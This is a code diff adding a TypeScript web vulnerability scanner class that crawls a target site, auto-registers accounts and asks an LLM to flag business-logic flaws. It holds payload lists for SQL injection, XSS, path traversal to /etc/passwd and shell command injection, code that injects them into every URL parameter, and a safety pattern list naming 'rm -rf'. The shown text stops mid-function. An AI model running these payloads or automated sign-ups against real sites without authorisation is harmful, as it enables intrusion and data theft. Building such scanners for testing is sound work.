@@ -1,0 +1,1949 @@
+import { chromium, Browser, BrowserContext, Page } from "playwright";
+import Groq from "groq-sdk";
+import { nanoid } from "nanoid";
+import type {
+  ShadowLogicScanConfig,
+  ShadowLogicScanResult,
+  ShadowLogicThought,
+  BusinessFlow,
+  BusinessFlowNode,
+  BusinessLogicVulnerability,
+  ShadowLogicTestType,
+  ShadowLogicPhase,
+  ThoughtType,
+  SHADOW_LOGIC_COSTS,
+} from "@shared/shadowLogic";
+import { storage } from "../storage";
+// Lazy load socket functions to avoid circular dependencies
+let emitScanProgress: any;
+let emitUrlStream: any;
+let emitPhaseUpdate: any;
+let emitToScan: any;
+let emitAiThought: any;
+
+const loadSocketFunctions = async () => {
+  if (!emitScanProgress) {
+    try {
+      const socketManager = await import("../src/sockets/socketManager");
+      emitScanProgress = socketManager.emitScanProgress;
+      emitUrlStream = socketManager.emitUrlStream;
+      emitPhaseUpdate = socketManager.emitPhaseUpdate;
+      emitAiThought = socketManager.emitAiThought;
+      emitToScan = socketManager.emitToScan || ((scanId: string, event: string, data: any) => {
+        const io = socketManager.getSocketServer?.();
+        if (io) {
+          io.to(`scan:${scanId}`).emit(event, data);
+        }
+      });
+    } catch (error) {
+      console.error("Failed to load socket functions:", error);
+    }
+  }
+};
+
+const SAFETY_BLOCKED_PATTERNS = [
+  /delete|drop|truncate|remove.*all/i,
+  /admin.*password|password.*admin/i,
+  /rm\s+-rf/i,
+  /format.*drive/i,
+];
+
+const BLOCKED_DOMAINS = [
+  ".gov",
+  ".mil",
+  ".edu",
+  "bank",
+  "paypal",
+  "stripe.com",
+  "visa.com",
+  "mastercard.com",
+];
+
+interface GeminiAnalysisResult {
+  businessFlows: string[];
+  criticalEndpoints: string[];
+  potentialVulnerabilities: string[];
+  recommendedTests: ShadowLogicTestType[];
+}
+
+interface RateLimitConfig {
+  requestsPerMinute: number;
+  lastRequestTime: number;
+  requestCount: number;
+}
+
+export class ShadowLogicAgent {
+  private browser: Browser | null = null;
+  private context: BrowserContext | null = null;
+  private page: Page | null = null;
+  private groq: Groq | null = null;
+  private scanResult: ShadowLogicScanResult;
+  private onUpdate: ((thought: ShadowLogicThought) => void) | null = null;
+  private config: ShadowLogicScanConfig;
+  private discoveredUrls: Set<string> = new Set();
+  private visitedUrls: Set<string> = new Set();
+  private networkRequests: Map<string, { method: string; url: string; body?: string; response?: string }> = new Map();
+  private scanId: string = "";
+  private userId: string = "";
+  
+  // Event batching for performance optimization
+  private eventBatch: any[] = [];
+  private eventBatchTimer: NodeJS.Timeout | null = null;
+  private lastUrlCount: number = 0;
+  
+  // Resource-saving mode
+  private concurrentRequests: number = 0;
+  private maxConcurrentRequests: number = 2;
+  private groqAnalysisInProgress: boolean = false;
+  private lastRequestTime: number = 0;
+  private requestDelayMs: number = 250;
+
+  constructor(config: ShadowLogicScanConfig, userId: string, scanId: string, onUpdate?: (thought: ShadowLogicThought) => void) {
+    this.config = config;
+    this.userId = userId;
+    this.scanId = scanId;
+    this.onUpdate = onUpdate || null;
+    
+    this.scanResult = {
+      id: nanoid(),
+      userId,
+      targetUrl: config.targetUrl,
+      status: "initializing",
+      startedAt: new Date().toISOString(),
+      businessFlows: [],
+      vulnerabilities: [],
+      thoughts: [],
+      statistics: {
+        pagesVisited: 0,
+        formsAnalyzed: 0,
+        apiEndpointsDiscovered: 0,
+        testsExecuted: 0,
+        vulnerabilitiesFound: 0,
+        timeElapsed: 0,
+      },
+      creditCost: 250,
+    };
+
+    if (process.env.GROQ_API_KEY) {
+      this.groq = new Groq({ apiKey: process.env.GROQ_API_KEY });
+    }
+  }
+
+  private cleanHtmlForGemini(html: string): string {
+    let cleaned = html
+      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
+      .replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, '')
+      .replace(/<!--[\s\S]*?-->/g, '')
+      .replace(/\s+/g, ' ')
+      .trim();
+    if (cleaned.length > 10000) {
+      cleaned = cleaned.substring(0, 10000) + '...';
+    }
+    return cleaned;
+  }
+
+  // Rate limiting removed - Groq has high throughput with no restrictive rate limits
+  private async enforceRateLimit(): Promise<void> {
+    // No rate limiting needed for Groq - proceed immediately
+    return Promise.resolve();
+  }
+
+  private addThought(type: ThoughtType, message: string, details?: string): void {
+    const thought: ShadowLogicThought = {
+      id: nanoid(),
+      timestamp: new Date().toISOString(),
+      type,
+      message,
+      details,
+    };
+    this.scanResult.thoughts.push(thought);
+    
+    // AGGRESSIVE FILTERING: ONLY emit vulnerabilityFound and aiThought events
+    // Suppress ALL observation and discovery events to save bandwidth and CPU
+    const isVulnerability = message.includes('VULNERABILITY') || message.includes('[CONFIRMED]') || message.includes('[POTENTIAL]');
+    const isAiThought = type === 'reasoning' && message.includes('[AI THOUGHT') || message.includes('[Groq]');
+    
+    if (isVulnerability || isAiThought) {
+      if (this.onUpdate) {
+        this.onUpdate(thought);
+      }
+    }
+  }
+  
+  private async waitForConcurrencySlot(): Promise<void> {
+    while (this.concurrentRequests >= this.maxConcurrentRequests) {
+      await new Promise(resolve => setTimeout(resolve, 50));
+    }
+    this.concurrentRequests++;
+  }
+  
+  private releaseConcurrencySlot(): void {
+    this.concurrentRequests--;
+  }
+  
+  private async enforceRequestDelay(): Promise<void> {
+    const now = Date.now();
+    const timeSinceLastRequest = now - this.lastRequestTime;
+    if (timeSinceLastRequest < this.requestDelayMs) {
+      await new Promise(resolve => setTimeout(resolve, this.requestDelayMs - timeSinceLastRequest));
+    }
+    this.lastRequestTime = Date.now();
+  }
+  
+  private cleanupCaches(): void {
+    // Clear caches every 200 items to save RAM
+    if (this.discoveredUrls.size > 200) {
+      const urlsArray = Array.from(this.discoveredUrls);
+      const urlsToKeep = new Set(urlsArray.slice(-100)); // Keep only last 100
+      this.discoveredUrls = urlsToKeep;
+    }
+    
+    if (this.networkRequests.size > 200) {
+      const requestsArray = Array.from(this.networkRequests.entries());
+      const requestsToKeep = new Map(requestsArray.slice(-100)); // Keep only last 100
+      this.networkRequests = requestsToKeep;
+    }
+  }
+  
+  // ============================================
+  // DEEP VERIFICATION HELPERS
+  // ============================================
+  
+  private async performDifferentialAnalysis(baseUrl: URL, paramName: string, payload1: string, payload2: string): Promise<{ response1: string; response2: string; differs: boolean }> {
+    if (!this.page) return { response1: "", response2: "", differs: false };
+    
+    const testUrl1 = new URL(baseUrl.toString());
+    testUrl1.searchParams.set(paramName, payload1);
+    
+    const testUrl2 = new URL(baseUrl.toString());
+    testUrl2.searchParams.set(paramName, payload2);
+    
+    try {
+      // Test first payload
+      await this.page.goto(testUrl1.toString(), { timeout: 5000, waitUntil: "domcontentloaded" });
+      const content1 = await this.page.content();
+      
+      // Test second payload
+      await this.page.goto(testUrl2.toString(), { timeout: 5000, waitUntil: "domcontentloaded" });
+      const content2 = await this.page.content();
+      
+      // Compare responses - if they differ significantly, differential analysis succeeded
+      const differs = content1.length !== content2.length || !content1.includes(content2.substring(0, 100));
+      
+      return {
+        response1: content1.substring(0, 500),
+        response2: content2.substring(0, 500),
+        differs
+      };
+    } catch {
+      return { response1: "", response2: "", differs: false };
+    }
+  }
+  
+  private extractDatabaseErrorSignature(content: string): string | null {
+    const lowerContent = content.toLowerCase();
+    
+    // MySQL/MariaDB signatures
+    if (lowerContent.includes("mysql") || lowerContent.includes("you have an error in your sql")) {
+      return "MySQL error detected";
+    }
+    
+    // PostgreSQL signatures
+    if (lowerContent.includes("postgresql") || lowerContent.includes("error: syntax error")) {
+      return "PostgreSQL error detected";
+    }
+    
+    // Oracle signatures
+    if (lowerContent.includes("oracle") || lowerContent.includes("ora-")) {
+      return "Oracle error detected";
+    }
+    
+    // SQL Server signatures
+    if (lowerContent.includes("mssql") || lowerContent.includes("sql server")) {
+      return "SQL Server error detected";
+    }
+    
+    // Generic SQL error signatures
+    if (lowerContent.includes("sql syntax") || lowerContent.includes("syntax error") || lowerContent.includes("database error")) {
+      return "SQL error detected";
+    }
+    
+    return null;
+  }
+  
+  private extractXSSSignature(content: string, payload: string): boolean {
+    // Check if exact payload is reflected
+    if (content.includes(payload)) return true;
+    
+    // Check if HTML-encoded version is reflected
+    if (content.includes(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"))) return true;
+    
+    // Check for script execution indicators
+    if (payload.includes("alert") && (content.includes("<script>alert") || content.includes("onerror=alert"))) {
+      return true;
+    }
+    
+    return false;
+  }
+  
+  private extractLFISignature(content: string): string | null {
+    // System file signatures
+    const systemSignatures = [
+      { pattern: "root:x:", name: "/etc/passwd" },
+      { pattern: "Administrator:", name: "SAM" },
+      { pattern: "[boot loader]", name: "boot.ini" },
+      { pattern: "<?php", name: "PHP source" },
+      { pattern: "<?=", name: "PHP short tags" },
+      { pattern: "<%", name: "ASP tags" },
+      { pattern: "daemon:x:", name: "System user" },
+      { pattern: "/bin/bash", name: "Shell binary" }
+    ];
+    
+    for (const sig of systemSignatures) {
+      if (content.includes(sig.pattern)) {
+        return `System file signature found: ${sig.name}`;
+      }
+    }
+    
+    return null;
+  }
+  
+  private flushEventBatch(): void {
+    if (this.eventBatch.length === 0) return;
+    
+    // Emit batched events as a single socket message
+    if (this.eventBatch.length > 0) {
+      emitToScan?.(this.scanId, "shadowLogic:batch", {
+        events: this.eventBatch,
+        timestamp: new Date().toISOString(),
+      });
+    }
+    this.eventBatch = [];
+  }
+  
+  private scheduleEventBatch(event: any, delayMs: number = 2000): void {
+    this.eventBatch.push(event);
+    
+    // Clear existing timer
+    if (this.eventBatchTimer) {
+      clearTimeout(this.eventBatchTimer);
+    }
+    
+    // Set new timer to flush batch after 2 seconds (increased from 500ms for resource saving)
+    this.eventBatchTimer = setTimeout(() => {
+      this.flushEventBatch();
+    }, delayMs);
+  }
+  
+  private emitDiscoverySummary(): void {
+    // NO-OP: Discovery summaries disabled to save bandwidth and CPU
+    // Only vulnerabilities and AI thoughts are emitted
+  }
+
+  private updatePhase(phase: ShadowLogicPhase): void {
+    this.scanResult.status = phase;
+    this.addThought("observation", `Phase changed to: ${phase}`);
+    
+    // Emit socket event for phase update with color coding
+    if (phase === "testing") {
+      emitPhaseUpdate?.(this.scanId, "Testing");
+    } else if (phase === "mapping") {
+      emitPhaseUpdate?.(this.scanId, "Mapping");
+    } else if (phase === "reporting") {
+      emitPhaseUpdate?.(this.scanId, "Reporting");
+    }
+  }
+
+  private isSafeAction(action: string): boolean {
+    if (!this.config.safetyMode) return true;
+    return !SAFETY_BLOCKED_PATTERNS.some(pattern => pattern.test(action));
+  }
+
+  private isBlockedDomain(url: string): boolean {
+    return BLOCKED_DOMAINS.some(domain => url.toLowerCase().includes(domain));
+  }
+
+  async initialize(): Promise<void> {
+    this.updatePhase("initializing");
+    console.log(`[ShadowLogic:${this.scanId}] INIT: Starting browser initialization`);
+    this.addThought("action", "Launching headless browser...");
+
+    if (this.isBlockedDomain(this.config.targetUrl)) {
+      throw new Error("Target domain is blocked for security reasons");
+    }
+
+    try {
+      console.log(`[ShadowLogic:${this.scanId}] INIT: Launching Chromium with timeout 30s`);
+      this.browser = await Promise.race([
+        chromium.launch({
+          headless: this.config.headless,
+          executablePath: process.env.PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH || undefined,
+          args: [
+            "--no-sandbox",
+            "--disable-setuid-sandbox",
+            "--disable-dev-shm-usage",
+            "--disable-accelerated-2d-canvas",
+            "--disable-gpu",
+            "--window-size=1920,1080",
+          ],
+        }),
+        new Promise<never>((_, reject) => setTimeout(() => reject(new Error("Browser launch timeout after 30s")), 30000))
+      ]);
+
+      console.log(`[ShadowLogic:${this.scanId}] INIT: Browser launched, creating context`);
+      this.context = await this.browser.newContext({
+        viewport: { width: 1920, height: 1080 },
+        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        ignoreHTTPSErrors: true,
+      });
+
+      this.page = await this.context.newPage();
+
+      this.page.on("request", (request) => {
+        const url = request.url();
+        const method = request.method();
+        if (url.includes("/api/") || url.includes("/graphql")) {
+          this.networkRequests.set(`${method}-${url}`, {
+            method,
+            url,
+            body: request.postData() || undefined,
+          });
+          this.scanResult.statistics.apiEndpointsDiscovered++;
+        }
+      });
+
+      this.page.on("response", async (response) => {
+        const url = response.url();
+        const request = response.request();
+        const key = `${request.method()}-${url}`;
+        if (this.networkRequests.has(key)) {
+          try {
+            const body = await response.text();
+            const existing = this.networkRequests.get(key)!;
+            existing.response = body.substring(0, 5000);
+          } catch {}
+        }
+      });
+
+      console.log(`[ShadowLogic:${this.scanId}] INIT: Context and page created successfully`);
+      this.addThought("success", "Browser initialized successfully");
+      emitToScan?.(this.scanId, "shadowLogic:system", {
+        message: "[DEBUG] Browser initialized - ready for page navigation"
+      });
+    } catch (error) {
+      console.error(`[ShadowLogic:${this.scanId}] INIT FAILED:`, error);
+      this.addThought("error", `Failed to initialize browser: ${error}`);
+      emitToScan?.(this.scanId, "shadowLogic:system", {
+        message: `[ERROR] Browser initialization failed: ${error}`
+      });
+      throw error;
+    }
+  }
+
+  async attemptRegistration(): Promise<boolean> {
+    if (!this.page || !this.config.registrationUrl) return false;
+
+    this.updatePhase("registering");
+    this.addThought("action", "Attempting self-registration on target site...");
+
+    try {
+      await this.page.goto(this.config.registrationUrl, { timeout: 30000 });
+      await this.page.waitForLoadState("networkidle");
+
+      const tempEmail = `shadowlogic_${nanoid(8)}@test.local`;
+      const tempPassword = `SL_${nanoid(12)}!`;
+      const tempUsername = `shadowlogic_${nanoid(6)}`;
+
+      const emailSelectors = ['input[type="email"]', 'input[name="email"]', '#email'];
+      const passwordSelectors = ['input[type="password"]', 'input[name="password"]', '#password'];
+      const usernameSelectors = ['input[name="username"]', '#username', 'input[name="name"]'];
+      const submitSelectors = ['button[type="submit"]', 'input[type="submit"]', 'button:has-text("Sign up")', 'button:has-text("Register")'];
+
+      for (const selector of emailSelectors) {
+        const element = await this.page.$(selector);
+        if (element) {
+          await element.fill(this.config.testCredentials?.email || tempEmail);
+          this.addThought("action", `Filled email field: ${selector}`);
+          break;
+        }
+      }
+
+      for (const selector of usernameSelectors) {
+        const element = await this.page.$(selector);
+        if (element) {
+          await element.fill(this.config.testCredentials?.username || tempUsername);
+          this.addThought("action", `Filled username field: ${selector}`);
+          break;
+        }
+      }
+
+      for (const selector of passwordSelectors) {
+        const elements = await this.page.$$(selector);
+        for (const element of elements) {
+          await element.fill(this.config.testCredentials?.password || tempPassword);
+        }
+        if (elements.length > 0) {
+          this.addThought("action", `Filled ${elements.length} password field(s)`);
+        }
+      }
+
+      for (const selector of submitSelectors) {
+        const element = await this.page.$(selector);
+        if (element) {
+          await element.click();
+          this.addThought("action", `Clicked submit button: ${selector}`);
+          break;
+        }
+      }
+
+      await this.page.waitForLoadState("networkidle");
+      this.addThought("success", "Registration attempt completed");
+      return true;
+    } catch (error) {
+      this.addThought("warning", `Registration failed: ${error}`);
+      return false;
+    }
+  }
+
+  async mapBusinessFlows(): Promise<void> {
+    if (!this.page) return;
+
+    this.updatePhase("mapping");
+    console.log(`[ShadowLogic:${this.scanId}] MAP: Starting mapping phase`);
+    this.addThought("reasoning", "Starting business flow mapping - crawling the application to understand state machine...");
+    
+    // Emit phase update via socket
+    emitToScan?.(this.scanId, "shadowLogic:system", {
+      message: "[PHASE] Mapping business flows - discovering application URLs..."
+    });
+
+    // Emergency pulse: if no URLs found after 2 minutes, send warning
+    const emergencyTimeout = setTimeout(() => {
+      if (this.discoveredUrls.size === 0) {
+        console.warn(`[ShadowLogic:${this.scanId}] EMERGENCY: No URLs found after 2 minutes`);
+        emitToScan?.(this.scanId, "shadowLogic:system", {
+          message: "[WARNING] Still analyzing structure, please wait... (2+ minutes elapsed)"
+        });
+      }
+    }, 120000);
+
+    try {
+      console.log(`[ShadowLogic:${this.scanId}] MAP: Navigating to ${this.config.targetUrl}`);
+      await Promise.race([
+        this.page.goto(this.config.targetUrl, { timeout: 30000 }),
+        new Promise<never>((_, reject) => setTimeout(() => reject(new Error("Page navigation timeout after 30s")), 30000))
+      ]);
+      
+      console.log(`[ShadowLogic:${this.scanId}] MAP: Waiting for network idle`);
+      await this.page.waitForLoadState("networkidle");
+      
+      this.scanResult.statistics.pagesVisited++;
+      this.discoveredUrls.add(this.config.targetUrl);
+      this.visitedUrls.add(this.config.targetUrl);
+
+      console.log(`[ShadowLogic:${this.scanId}] MAP: Starting crawl from initial page`);
+      await this.crawlPage(this.config.targetUrl, 0);
+
+      console.log(`[ShadowLogic:${this.scanId}] MAP: Crawl complete. Discovered ${this.discoveredUrls.size} URLs`);
+      clearTimeout(emergencyTimeout);
+
+      if (this.groq) {
+        console.log(`[ShadowLogic:${this.scanId}] MAP: Groq available, starting ultra-fast async AI analysis`);
+        // Non-blocking: start AI analysis in background while crawler continues at full speed
+        this.analyzeWithGroq().catch(err => {
+          console.error(`[ShadowLogic:${this.scanId}] Async Groq analysis error:`, err);
+          this.addThought("warning", `Async Groq analysis error: ${err}`);
+        });
+      } else {
+        console.warn(`[ShadowLogic:${this.scanId}] MAP: Groq not initialized, skipping AI analysis`);
+      }
+
+      emitToScan?.(this.scanId, "shadowLogic:system", {
+        message: `[SUCCESS] Mapping complete - ${this.discoveredUrls.size} URLs, ${this.scanResult.statistics.formsAnalyzed} forms, ${this.scanResult.statistics.apiEndpointsDiscovered} API endpoints`
+      });
+      this.addThought("success", `Mapping complete. Discovered ${this.discoveredUrls.size} URLs, ${this.scanResult.statistics.formsAnalyzed} forms, ${this.scanResult.statistics.apiEndpointsDiscovered} API endpoints`);
+    } catch (error) {
+      clearTimeout(emergencyTimeout);
+      console.error(`[ShadowLogic:${this.scanId}] MAP FAILED:`, error);
+      this.addThought("error", `Mapping failed: ${error}`);
+      emitToScan?.(this.scanId, "shadowLogic:system", {
+        message: `[ERROR] Mapping failed: ${error}`
+      });
+    }
+  }
+
+  private async crawlPage(url: string, depth: number): Promise<void> {
+    if (!this.page || depth >= this.config.maxDepth) return;
+    if (this.config.excludeUrls?.some(exclude => url.includes(exclude))) return;
+
+    try {
+      console.log(`[ShadowLogic:${this.scanId}] CRAWL: depth=${depth}, concurrency=${this.concurrentRequests}/${this.maxConcurrentRequests}`);
+      const links = await Promise.race([
+        this.page.$$eval("a[href]", (anchors) =>
+          anchors.map((a) => (a as HTMLAnchorElement).href).filter((href) => href.startsWith("http"))
+        ),
+        new Promise<never>((_, reject) => setTimeout(() => reject(new Error("Link extraction timeout after 10s")), 10000))
+      ]);
+
+      // NO-OP: Discovery events disabled to save bandwidth
+      // Stop emitting per-URL discovery events
+
+      // Emit progress (silent)
+      const progress = Math.min(Math.round((this.discoveredUrls.size / (this.config.maxDepth * 10)) * 100), 45);
+      emitScanProgress?.(this.scanId, progress, "mapping");
+
+      const forms = await this.page.$$("form");
+      this.scanResult.statistics.formsAnalyzed += forms.length;
+
+      for (const form of forms) {
+        const action = await form.getAttribute("action");
+        const method = await form.getAttribute("method");
+        const inputs = await form.$$("input, select, textarea");
+        
+        const flowNode: BusinessFlowNode = {
+          id: nanoid(),
+          url: url,
+          title: `Form: ${action || "inline"}`,
+          type: "form",
+          method: method?.toUpperCase() || "POST",
+          parameters: {},
+          nextNodes: [],
+        };
+
+        for (const input of inputs) {
+          const name = await input.getAttribute("name");
+          const type = await input.getAttribute("type");
+          if (name) {
+            flowNode.parameters![name] = type || "text";
+          }
+        }
+
+        if (!this.scanResult.businessFlows.find(f => f.nodes.some(n => n.url === url && n.title === flowNode.title))) {
+          const flow: BusinessFlow = {
+            id: nanoid(),
+            name: `Flow from ${new URL(url).pathname}`,
+            description: `Business flow discovered at ${url}`,
+            nodes: [flowNode],
+            startNodeId: flowNode.id,
+            endNodeId: flowNode.id,
+            criticalNodes: [],
+          };
+          this.scanResult.businessFlows.push(flow);
+        }
+      }
+
+      const baseUrl = new URL(this.config.targetUrl).origin;
+      const relevantLinks = links.filter(link => {
+        try {
+          const linkUrl = new URL(link);
+          return linkUrl.origin === baseUrl && !this.visitedUrls.has(link);
+        } catch {
+          return false;
+        }
+      });
+
+      // Concurrency control: limit to 2 concurrent requests
+      for (const link of relevantLinks.slice(0, 5)) {
+        if (this.visitedUrls.has(link)) continue;
+        
+        this.discoveredUrls.add(link);
+        this.visitedUrls.add(link);
+        
+        // Periodically cleanup caches
+        if (this.discoveredUrls.size % 50 === 0) {
+          this.cleanupCaches();
+        }
+        
+        try {
+          // Wait for concurrency slot
+          await this.waitForConcurrencySlot();
+          
+          // Enforce 250ms delay between requests
+          await this.enforceRequestDelay();
+          
+          try {
+            await this.page.goto(link, { timeout: 15000 });
+            await this.page.waitForLoadState("domcontentloaded");
+            this.scanResult.statistics.pagesVisited++;
+            await this.crawlPage(link, depth + 1);
+          } finally {
+            this.releaseConcurrencySlot();
+          }
+        } catch (error) {
+          this.releaseConcurrencySlot();
+        }
+      }
+    } catch (error) {
+      // Silent fail - no observation events
+    }
+  }
+
+  private async analyzeWithGroq(): Promise<void> {
+    if (!this.groq) return;
+    
+    // Concurrency control: Only 1 AI analysis task at a time
+    if (this.groqAnalysisInProgress) {
+      console.log(`[ShadowLogic:${this.scanId}] Groq analysis already running, skipping...`);
+      return;
+    }
+    this.groqAnalysisInProgress = true;
+
+    this.addThought("reasoning", "[AI THOUGHT] Starting Groq AI analysis...");
+
+    try {
+      const allUrls = Array.from(this.discoveredUrls);
+      // Process all URLs without batching constraints - Groq has high throughput
+      const batchSize = 10; // Larger batches since no rate limit
+
+      for (let i = 0; i < allUrls.length; i += batchSize) {
+        const batch = allUrls.slice(i, i + batchSize);
+        
+        try {
+          // No rate limiting needed - Groq is fast and has high limits
+          const cleanedEndpoints = Array.from(this.networkRequests.values())
+            .slice(0, 10)
+            .map(ep => ({ method: ep.method, url: ep.url }));
+
+          const prompt = `Analyze these URLs for business logic vulnerabilities. Be concise.
+
+URLs to analyze: ${JSON.stringify(batch)}
+
+Identify:
+1. Potential business flows
+2. Critical endpoints
+3. Vulnerabilities
+4. Tests needed
+
+JSON format:
+{"businessFlows":["flow1"],"criticalEndpoints":["ep1"],"potentialVulnerabilities":["vuln1"],"recommendedTests":["price_manipulation"]}`;
+
+          let text = "";
+          try {
+            // Call Groq API with CORRECT chat.completions endpoint
+            console.log(`[ShadowLogic:${this.scanId}] Calling Groq chat.completions for batch ${Math.floor(i / batchSize) + 1}`);
+            const response = await (this.groq as any).chat.completions.create({
+              model: "llama-3.3-70b-versatile",
+              max_tokens: 1024,
+              messages: [
+                {
+                  role: "user",
+                  content: prompt,
+                },
+              ],
+            });
+            
+            // Groq returns response.choices[0].message.content
+            text = response?.choices?.[0]?.message?.content || "";
+            console.log(`[ShadowLogic:${this.scanId}] ✓ Groq responded with ${text.length} chars`);
+          } catch (groqError: any) {
+            const errorMsg = groqError?.message || groqError?.toString() || "Unknown Groq API error";
+            console.error(`[ShadowLogic:${this.scanId}] Groq API Error (Batch ${Math.floor(i / batchSize) + 1}):`, errorMsg);
+            this.addThought("warning", `Groq API temporary issue - continuing scan: ${errorMsg.substring(0, 100)}`);
+            
+            // Emit error to frontend but continue processing
+            emitToScan?.(this.scanId, "aiThought", {
+              timestamp: new Date().toISOString(),
+              thought: `Groq batch temporarily unavailable - scan continuing with basic analysis`,
+              type: "warning",
+              provider: "Groq",
+            });
+            continue; // Skip this batch but continue with others
+          }
+          const batchNum = Math.floor(i / batchSize) + 1;
+          const aiThought = `[AI THOUGHT - Batch ${batchNum}]: Groq analyzed ${batch.length} URLs instantly - ${text.substring(0, 150)}...`;
+          
+          console.log(`[ShadowLogic:${this.scanId}] ${aiThought}`);
+          this.addThought("reasoning", aiThought);
+          
+          // Emit AI thought in real-time via socket
+          emitToScan?.(this.scanId, "aiThought", {
+            timestamp: new Date().toISOString(),
+            thought: aiThought,
+            batchIndex: batchNum,
+            batchSize: batch.length,
+            provider: "Groq",
+          });
+
+          try {
+            const jsonMatch = text.match(/\{[\s\S]*\}/);
+            if (jsonMatch) {
+              const analysis: GeminiAnalysisResult = JSON.parse(jsonMatch[0]);
+              
+              for (const flow of analysis.businessFlows || []) {
+                this.addThought("discovery", `[Groq] Identified flow: ${flow}`);
+              }
+              
+              for (const vuln of analysis.potentialVulnerabilities || []) {
+                const vulnThought = `[Groq] Potential vulnerability: ${vuln}`;
+                this.addThought("warning", vulnThought);
+                emitToScan?.(this.scanId, "aiThought", {
+                  timestamp: new Date().toISOString(),
+                  thought: vulnThought,
+                  type: "vulnerability",
+                  provider: "Groq",
+                });
+              }
+            }
+          } catch (parseError) {
+            console.log(`[ShadowLogic:${this.scanId}] JSON parse non-fatal error:`, parseError);
+            this.addThought("observation", "Groq response parsed for insights");
+          }
+        } catch (batchError: any) {
+          const errorMsg = batchError?.message || batchError?.toString() || "Unknown batch error";
+          console.error(`[ShadowLogic:${this.scanId}] Batch ${Math.floor(i / batchSize) + 1} error:`, errorMsg);
+          this.addThought("warning", `Batch analysis error - continuing: ${errorMsg.substring(0, 80)}`);
+          // Don't rethrow - let scan continue
+        }
+      }
+
+      this.addThought("success", "[AI THOUGHT] Groq AI analysis completed");
+    } catch (error) {
+      this.addThought("warning", `Groq analysis error: ${error}`);
+    } finally {
+      // Release Groq analysis slot
+      this.groqAnalysisInProgress = false;
+    }
+  }
+
+  private async analyzeWithAI(): Promise<void> {
+    // Legacy function - delegates to Groq
+    await this.analyzeWithGroq();
+  }
+
+  // ============================================
+  // AGGRESSIVE ATTACK PAYLOADS
+  // ============================================
+  private readonly SQLI_PAYLOADS = [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' OR 1=1#",
+    "1' OR '1'='1",
+    "admin'--",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT 1,2,3--",
+    "1; DROP TABLE users--",
+    "' AND 1=1--",
+    "' AND '1'='1",
+    "\" OR \"1\"=\"1",
+    "1 OR 1=1",
+    "-1 OR 1=1",
+    "' OR ''='",
+    "') OR ('1'='1",
+  ];
+
+  private readonly XSS_PAYLOADS = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "javascript:alert(1)",
+    "'><script>alert(1)</script>",
+    "\"><script>alert(1)</script>",
+    "<body onload=alert(1)>",
+    "<iframe src=javascript:alert(1)>",
+    "'-alert(1)-'",
+    "\"-alert(1)-\"",
+    "<ScRiPt>alert(1)</ScRiPt>",
+    "<<script>alert(1)//<</script>",
+    "<img src=x onerror=\"alert(1)\">",
+    "%3Cscript%3Ealert(1)%3C/script%3E",
+    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+  ];
+
+  private readonly PATH_TRAVERSAL_PAYLOADS = [
+    "../etc/passwd",
+    "../../etc/passwd",
+    "../../../etc/passwd",
+    "....//....//etc/passwd",
+    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "/etc/passwd",
+    "....//....//....//etc/passwd",
+    "..%2f..%2f..%2fetc%2fpasswd",
+    "..%252f..%252f..%252fetc%252fpasswd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "file:///etc/passwd",
+    "/proc/self/environ",
+    "php://filter/convert.base64-encode/resource=index.php",
+  ];
+
+  private readonly COMMAND_INJECTION_PAYLOADS = [
+    "; ls -la",
+    "| ls -la",
+    "`ls -la`",
+    "$(ls -la)",
+    "; cat /etc/passwd",
+    "| cat /etc/passwd",
+    "; whoami",
+    "| whoami",
+    "&& whoami",
+    "|| whoami",
+    "; id",
+    "| id",
+  ];
+
+  private readonly IDOR_PAYLOADS = [
+    "1", "2", "0", "-1", "999999",
+    "admin", "root", "user",
+    "../admin", "1 OR 1=1",
+  ];
+
+  // ============================================
+  // AGGRESSIVE TESTING METHODS
+  // ============================================
+  
+  private async aggressiveParameterInjection(): Promise<void> {
+    if (!this.page) return;
+    
+    this.addThought("action", "[AGGRESSIVE] Starting payload injection on ALL URL parameters...");
+    emitToScan?.(this.scanId, "shadowLogic:system", {
+      message: "[AGGRESSIVE] Injecting attack payloads into URL parameters..."
+    });
+
+    const urlsWithParams = Array.from(this.discoveredUrls).filter(url => url.includes("?") || url.includes("="));
+    this.addThought("reasoning", `Found ${urlsWithParams.length} URLs with parameters to test`);
+
+    for (const url of urlsWithParams) {
+      try {
+        const parsedUrl = new URL(url);
+        const params = new URLSearchParams(parsedUrl.search);
+        
+        for (const [paramName, originalValue] of params.entries()) {
+          this.addThought("action", `[ATTACK] Testing parameter: ${paramName}=${originalValue}`);
+          
+          // Test SQL Injection
+          for (const payload of this.SQLI_PAYLOADS.slice(0, 5)) {
+            await this.testPayload(parsedUrl, paramName, payload, "sqli");
+          }
+          
+          // Test XSS
+          for (const payload of this.XSS_PAYLOADS.slice(0, 5)) {
+            await this.testPayload(parsedUrl, paramName, payload, "xss");
+          }
+          
+          // Test Path Traversal
+          for (const payload of this.PATH_TRAVERSAL_PAYLOADS.slice(0, 5)) {
+            await this.testPayload(parsedUrl, paramName, payload, "path_traversal");
+          }
+          
+          this.scanResult.statistics.testsExecuted += 15;
+        }
+      } catch (error) {
+        this.addThought("warning", `Error testing URL ${url}: ${error}`);
+      }
+    }
+  }
+
+  private async testPayload(baseUrl: URL, paramName: string, payload: string, attackType: string): Promise<void> {
+    if (!this.page) return;
+    
+    const testUrl = new URL(baseUrl.toString());
+    testUrl.searchParams.set(paramName, payload);
+    
+    try {
+      const startTime = Date.now();
+      const response = await this.page.goto(testUrl.toString(), { timeout: 10000, waitUntil: "domcontentloaded" });
+      const responseTime = Date.now() - startTime;
+      
+      if (!response) return;
+      
+      const status = response.status();
+      const content = await this.page.content();
+      const contentLower = content.toLowerCase();
+      
+      // Check for SQL Injection indicators with DIFFERENTIAL ANALYSIS
